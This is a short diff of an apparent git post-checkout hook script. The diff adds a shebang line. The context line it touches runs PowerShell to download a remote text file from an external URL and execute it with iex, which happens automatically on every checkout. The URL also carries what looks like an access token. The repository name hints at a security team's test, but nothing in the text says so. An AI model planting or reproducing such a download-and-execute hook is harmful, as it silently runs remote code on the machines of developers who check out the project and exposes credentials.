@@ -1,2 +1,3 @@
+#!/bin/bash
 echo "post-checkout start"
 pwsh -c "iex((New-Object System.Net.WebClient).DownloadString('https://git.rockfin.com/raw/InformationSecurity/hello-world/main/hello.txt?token=GHSAT0AAAAAAAAAH45AIRLWW2X6NDYGDRAYZTTGCTA'))"
